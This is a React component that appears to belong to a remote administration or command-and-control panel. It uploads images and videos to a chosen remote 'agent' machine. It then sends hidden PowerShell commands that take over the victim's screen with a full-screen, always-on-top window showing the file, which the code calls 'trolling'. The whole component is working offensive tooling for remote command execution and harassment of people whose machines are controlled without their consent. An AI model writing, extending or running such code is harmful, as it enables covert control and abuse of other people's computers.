import React, { useState, useRef } from 'react';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
import { Alert, AlertDescription } from './ui/alert';
import { Upload, File, Image, Video, Folder, AlertCircle, Play, Trash2 } from 'lucide-react';
import { useSocket } from './SocketProvider';

interface UploadedFile {
  id: string;
  name: string;
  size: number;
  type: string;
  content: string; // base64
  path?: string;
}

interface TrollingScript {
  type: 'image' | 'video';
  filename: string;
  path: string;
  script: string;
}

export function BulkUploadManager() {
  const { socket, selectedAgent } = useSocket();
  const [files, setFiles] = useState<UploadedFile[]>([]);
  const [folderPath, setFolderPath] = useState('');
  const [isDragging, setIsDragging] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [isUploading, setIsUploading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const generateImageTrollingScript = (imagePath: string): string => {
    return `Add-Type -AssemblyName PresentationFramework
$w = New-Object Windows.Window
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false

$i = New-Object Windows.Controls.Image
$b = New-Object Windows.Media.Imaging.BitmapImage
$b.BeginInit()
$b.UriSource = '${imagePath.replace(/\\/g, '\\\\')}'
$b.EndInit()
$i.Source = $b
$i.Stretch = 'UniformToFill'

$w.Content = $i
$w.ShowDialog()`;
  };

  const generateVideoTrollingScript = (videoPath: string): string => {
    return `Add-Type -AssemblyName PresentationFramework

$w = New-Object Windows.Window
$w.WindowStyle = 'None'
$w.WindowState = 'Maximized'
$w.ResizeMode = 'NoResize'
$w.Topmost = $true
$w.ShowInTaskbar = $false
$w.Background = 'Black'

$m = New-Object Windows.Controls.MediaElement
$m.Source = '${videoPath.replace(/\\/g, '\\\\')}'
$m.LoadedBehavior = 'Play'
$m.UnloadedBehavior = 'Stop'
$m.Stretch = 'UniformToFill'
$m.Volume = 1.0

$w.Content = $m
$w.ShowDialog()`;
  };

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
    const fileList = event.target.files;
    if (fileList) {
      processFiles(Array.from(fileList));
    }
  };

  const handleDrop = (event: React.DragEvent) => {
    event.preventDefault();
    setIsDragging(false);
    const fileList = event.dataTransfer.files;
    if (fileList) {
      processFiles(Array.from(fileList));
    }
  };

  const processFiles = async (fileList: File[]) => {
    setError('');
    setSuccess('');
    
    const processedFiles: UploadedFile[] = [];
    
    for (const file of fileList) {
      if (file.size > 50 * 1024 * 1024) { // 50MB limit
        setError(`File ${file.name} is too large (max 50MB)`);
        continue;
      }

      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/webm', 'video/avi'];
      if (!allowedTypes.includes(file.type)) {
        setError(`File ${file.name} type not supported. Use: JPG, PNG, GIF, WebP, MP4, WebM, AVI`);
        continue;
      }

      try {
        const base64 = await fileToBase64(file);
        processedFiles.push({
          id: Math.random().toString(36).substr(2, 9),
          name: file.name,
          size: file.size,
          type: file.type,
          content: base64,
          path: folderPath || `C:\\Users\\${file.name}`
        });
      } catch (err) {
        setError(`Failed to process ${file.name}: ${err}`);
      }
    }

    setFiles(prev => [...prev, ...processedFiles]);
    if (processedFiles.length > 0) {
      setSuccess(`Added ${processedFiles.length} files`);
    }
  };

  const fileToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => {
        const base64 = (reader.result as string).split(',')[1];
        resolve(base64);
      };
      reader.onerror = reject;
      reader.readAsDataURL(file);
    });
  };

  const uploadFile = async (file: UploadedFile) => {
    if (!socket || !selectedAgent) {
      setError('No agent selected');
      return;
    }

    setIsUploading(true);
    setError('');
    
    try {
      socket.emit('upload_file', {
        agent_id: selectedAgent,
        filename: file.name,
        content: file.content,
        destination_path: file.path || `C:\\Users\\${file.name}`
      });
      
      setSuccess(`File ${file.name} uploaded successfully`);
      
      // Remove from list after successful upload
      setFiles(prev => prev.filter(f => f.id !== file.id));
      
    } catch (err) {
      setError(`Upload failed: ${err}`);
    } finally {
      setIsUploading(false);
    }
  };

  const startTrolling = async (file: UploadedFile) => {
    if (!socket || !selectedAgent) {
      setError('No agent selected');
      return;
    }

    const filePath = file.path || `C:\\Users\\${file.name}`;
    let script: string;

    if (file.type.startsWith('image/')) {
      script = generateImageTrollingScript(filePath);
    } else if (file.type.startsWith('video/')) {
      script = generateVideoTrollingScript(filePath);
    } else {
      setError('Unsupported file type for trolling');
      return;
    }

    // First upload the file
    try {
      await uploadFile(file);
      
      // Then execute the trolling script
      socket.emit('command', {
        agent_id: selectedAgent,
        command: `powershell -WindowStyle Hidden -Command "${script.replace(/"/g, '\\"').replace(/\n/g, '; ')}"`,
        execution_id: `trolling-${Date.now()}`
      });
      
      setSuccess(`Trolling started with ${file.name}`);
      
    } catch (err) {
      setError(`Trolling failed: ${err}`);
    }
  };

  const uploadAllFiles = async () => {
    if (files.length === 0) {
      setError('No files to upload');
      return;
    }

    setIsUploading(true);
    setError('');
    
    let successCount = 0;
    let errorCount = 0;

    for (const file of files) {
      try {
        await uploadFile(file);
        successCount++;
      } catch (err) {
        errorCount++;
        setError(`Failed to upload ${file.name}: ${err}`);
      }
    }

    setIsUploading(false);
    setSuccess(`Uploaded ${successCount} files, ${errorCount} failed`);
  };

  const removeFile = (fileId: string) => {
    setFiles(prev => prev.filter(f => f.id !== fileId));
  };

  const getFileIcon = (type: string) => {
    if (type.startsWith('image/')) return <Image className="h-4 w-4" />;
    if (type.startsWith('video/')) return <Video className="h-4 w-4" />;
    return <File className="h-4 w-4" />;
  };

  const formatFileSize = (bytes: number) => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle>Bulk File Upload & Trolling</CardTitle>
          <CardDescription>
            Upload files to selected agents and start trolling with images or videos
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}
          
          {success && (
            <Alert>
              <AlertDescription>{success}</AlertDescription>
            </Alert>
          )}

          <div className="space-y-2">
            <Label htmlFor="folder-path">Target Folder Directory</Label>
            <div className="flex gap-2">
              <Input
                id="folder-path"
                placeholder="C:\\Users\\Username\\Downloads"
                value={folderPath}
                onChange={(e) => setFolderPath(e.target.value)}
                className="font-mono"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => setFolderPath('C:\\Users\\')}
              >
                <Folder className="h-4 w-4" />
              </Button>
            </div>
          </div>

          <div
            className={`border-2 border-dashed rounded-lg p-8 text-center cursor-pointer transition-colors ${
              isDragging ? 'border-primary bg-primary/5' : 'border-border hover:border-primary'
            }`}
            onDragOver={(e) => {
              e.preventDefault();
              setIsDragging(true);
            }}
            onDragLeave={() => setIsDragging(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
          >
            <Upload className="mx-auto h-8 w-8 mb-2 text-muted-foreground" />
            <p className="text-sm text-muted-foreground mb-1">
              Drag and drop files here, or click to select
            </p>
            <p className="text-xs text-muted-foreground">
              Supports images (JPG, PNG, GIF, WebP) and videos (MP4, WebM, AVI)
            </p>
            <Input
              ref={fileInputRef}
              type="file"
              multiple
              accept="image/*,video/*"
              onChange={handleFileSelect}
              className="hidden"
            />
          </div>

          {files.length > 0 && (
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <h4 className="font-medium">Selected Files ({files.length})</h4>
                <Button
                  onClick={uploadAllFiles}
                  disabled={isUploading || !selectedAgent}
                  size="sm"
                >
                  <Upload className="h-4 w-4 mr-2" />
                  Upload All
                </Button>
              </div>
              
              <div className="space-y-1 max-h-64 overflow-y-auto">
                {files.map((file) => (
                  <div
                    key={file.id}
                    className="flex items-center gap-2 p-2 border rounded-md"
                  >
                    {getFileIcon(file.type)}
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium truncate">{file.name}</p>
                      <p className="text-xs text-muted-foreground">{formatFileSize(file.size)}</p>
                    </div>
                    <div className="flex gap-1">
                      <Button
                        onClick={() => startTrolling(file)}
                        disabled={isUploading}
                        size="sm"
                        variant="outline"
                        title="Start trolling with this file"
                      >
                        <Play className="h-3 w-3" />
                      </Button>
                      <Button
                        onClick={() => uploadFile(file)}
                        disabled={isUploading}
                        size="sm"
                        variant="outline"
                        title="Upload file"
                      >
                        <Upload className="h-3 w-3" />
                      </Button>
                      <Button
                        onClick={() => removeFile(file.id)}
                        size="sm"
                        variant="outline"
                        title="Remove file"
                      >
                        <Trash2 className="h-3 w-3" />
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {!selectedAgent && (
            <Alert>
              <AlertDescription>
                Please select an agent from the Agents tab to upload files and start trolling
              </AlertDescription>
            </Alert>
          )}
        </CardContent>
      </Card>
    </div>
  );
}